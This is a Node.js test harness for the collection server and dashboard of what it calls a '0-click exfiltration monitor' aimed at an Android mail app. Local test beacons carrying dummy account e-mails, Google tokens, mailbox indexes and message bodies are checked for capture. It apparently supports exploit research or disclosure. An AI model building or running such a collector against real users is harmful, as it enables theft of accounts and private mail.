#!/usr/bin/env node
/* Local harness: runs the three Vercel handlers under a plain Node server so the whole thing can be
 * exercised without deploying.
 *
 *   node test_local.js            -> runs the checks and exits
 *
 * It mimics what Vercel provides: req.query, req.body reading, res.setHeader/statusCode/end.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');

const R = require('./api/r');
const DATA = require('./api/data');
const INDEX = fs.readFileSync(path.join(__dirname, 'index.html'));

const routes = {
  '/r': R,
  '/api/r': R,
  '/api/data': DATA,
};

const server = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  if (u.pathname === '/' || u.pathname === '/index.html') {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.end(INDEX);
  }
  const h = routes[u.pathname];
  if (!h) { res.statusCode = 404; return res.end('not found'); }
  req.query = Object.fromEntries(u.searchParams.entries());
  Promise.resolve(h(req, res)).catch((e) => {
    res.statusCode = 500;
    res.end('handler error: ' + e.message);
  });
});

let pass = 0, fail = 0;
const check = (name, ok, detail) => {
  console.log((ok ? '  PASS  ' : '  FAIL  ') + name + (ok || detail === undefined ? '' : '   ' + detail));
  ok ? pass++ : fail++;
};

function call(port, method, urlPath, body, headers) {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port, path: urlPath, method,
      headers: Object.assign({ 'Content-Type': 'text/plain' }, headers || {}) }, (res) => {
      let b = '';
      res.on('data', (c) => { b += c; });
      res.on('end', () => resolve({ status: res.statusCode, type: res.headers['content-type'], body: b }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

server.listen(0, '127.0.0.1', async () => {
  const port = server.address().port;
  console.log('='.repeat(78));
  console.log('local harness on 127.0.0.1:' + port);
  console.log('='.repeat(78));

  // dashboard page
  let r = await call(port, 'GET', '/');
  check('GET / serves the dashboard', r.status === 200 && r.body.includes('0-click exfiltration monitor'));

  // the payload's transport: a POST with Content-Type: text/plain and a browser UA
  const UA = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-N9810) AppleWebKit/537.36 '
    + '(KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36' };

  r = await call(port, 'POST', '/r?part=progress', '{"step":"start","ts":"t0"}', UA);
  check('POST /r -> 200 image/gif', r.status === 200 && String(r.type).startsWith('image/gif'),
    r.status + ' ' + r.type);

  r = await call(port, 'POST', '/r?part=progress', '{"step":"account","email":"a@b.test"}', UA);
  check('POST account beacon accepted', r.status === 200);

  r = await call(port, 'POST', '/r?part=progress', '{"step":"google_token","len":914}', UA);
  check('POST token beacon accepted', r.status === 200);

  const report = {
    agent: 'superhuman-mail-android', ts: 't', device: { ua: 'UA', lang: 'en-US', dpr: 2 },
    account: { email: 'a@b.test', name: 'Test User', raw: '<map/>' },
    google_token: { jwt: 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxIn0.sig', len: 44, claims: { sub: '1', email: 'a@b.test' } },
    settings: '<map/>',
    mailbox: { index_bytes: 11720106, ids_count: 1675, ids_top: ['1a0cf03674657e8b'] },
    messages: [
      { rank: 1, sid: '1a0cf03674657e8b', len: 8911, text: 'the delivered attack e-mail', html: '<html>1</html>' },
      { rank: 2, sid: '1a0cef0a71ae2706', len: 8921, text: 'second message', html: '<html>2</html>' },
    ],
    probes: [], errors: [],
  };
  r = await call(port, 'POST', '/r?part=report', JSON.stringify(report), UA);
  check('POST full report accepted', r.status === 200);

  // an image GET (what the media proxy does)
  r = await call(port, 'GET', '/r?part=pixel', null, UA);
  check('GET beacon -> 200 image/gif', r.status === 200 && String(r.type).startsWith('image/gif'));

  // the dashboard's data endpoint
  r = await call(port, 'GET', '/api/data');
  let d = null;
  try { d = JSON.parse(r.body); } catch (e) { }
  check('GET /api/data -> JSON', r.status === 200 && d !== null, r.status);
  if (d) {
    check('  storage mode reported', d.storage === 'vercel-kv' || d.storage === 'memory', d.storage);
    check('  beacon count', d.count === 5, d.count);
    check('  account e-mail', d.account_email === 'a@b.test', d.account_email);
    check('  account name', d.account_name === 'Test User', d.account_name);
    check('  token captured', d.token_len === 44, d.token_len);
    check('  claims captured', d.claims && d.claims.sub === '1');
    check('  index bytes', d.index_bytes === 11720106, d.index_bytes);
    check('  thread ids', d.ids === 1675, d.ids);
    check('  two messages', d.messages.length === 2, d.messages.length);
    check('  message #1 is the delivered e-mail',
      d.messages[0].sid === '1a0cf03674657e8b' && d.messages[0].text.length > 0);
    check('  progress steps recorded', d.progress.length === 3, d.progress.length);
  }

  // clearing
  r = await call(port, 'GET', '/api/data?clear=1');
  r = await call(port, 'GET', '/api/data');
  d = JSON.parse(r.body);
  check('clear wipes the capture', d.count === 0, d.count);

  console.log();
  console.log('='.repeat(78));
  console.log(pass + '/' + (pass + fail) + ' checks passed');
  console.log('='.repeat(78));
  server.close();
  process.exit(fail ? 1 : 0);
});
